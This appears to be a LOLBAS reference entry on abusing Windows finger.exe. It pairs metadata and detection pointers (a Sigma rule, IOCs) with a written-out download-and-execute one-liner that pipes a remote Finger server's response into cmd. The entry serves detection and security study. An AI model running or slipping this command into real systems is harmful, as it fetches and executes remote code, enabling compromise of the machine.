---
Acknowledgement:
- Handle: '@rubn_RB'
  Person: Ruben Revuelta (MAPFRE CERT)
- Handle: '@Ocelotty6669'
  Person: Jose A. Jimenez (MAPFRE CERT)
- Person: Malwrolog
Author: Ruben Revuelta
Commands:
- Category: Download
  Command: finger user@example.host.com | more +2 | cmd
  Description: Downloads payload from remote Finger server. This example connects
    to "example.host.com" asking for user "user"; the result could contain malicious
    shellcode which is executed by the cmd process.
  MitreID: T1105
  OperatingSystem: Windows 8.1, Windows 10, Windows 11, Windows Server 2008, Windows
    Server 2008R2, Windows Server 2012, Windows Server 2012R2, Windows Server 2016,
    Windows Server 2019, Windows Server 2022
  Privileges: User
  Usecase: Download malicious payload
Created: 2021-08-30
Description: Displays information about a user or users on a specified remote computer
  that is running the Finger service or daemon
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_finger_usage.yml
- IOC: finger.exe should not be run on a normal workstation.
- IOC: finger.exe connecting to external resources.
Full_Path:
- Path: c:\windows\system32\finger.exe
- Path: c:\windows\syswow64\finger.exe
Name: Finger.exe
Resources:
- Link: https://twitter.com/DissectMalware/status/997340270273409024
- Link: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11)
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/osbinaries
---

# Finger.exe

Displays information about a user or users on a specified remote computer that is running the Finger service or daemon

# Path(s)

- `c:\windows\system32\finger.exe`
- `c:\windows\syswow64\finger.exe`

# Download Commands

Downloads payload from remote Finger server. This example connects to "example.host.com" asking for user "user"; the result could contain malicious shellcode which is executed by the cmd process.

```batch
finger user@example.host.com | more +2 | cmd
```

- **Usecase:** Download malicious payload
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 8.1, Windows 10, Windows 11, Windows Server 2008, Windows Server 2008R2, Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019, Windows Server 2022



# Resource(s)

- https://twitter.com/DissectMalware/status/997340270273409024
- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11)
# Acknowledgements

- Ruben Revuelta (Authored, 2021-08-30)
- Ruben Revuelta (MAPFRE CERT) (@rubn_RB)
- Jose A. Jimenez (MAPFRE CERT) (@Ocelotty6669)
- Malwrolog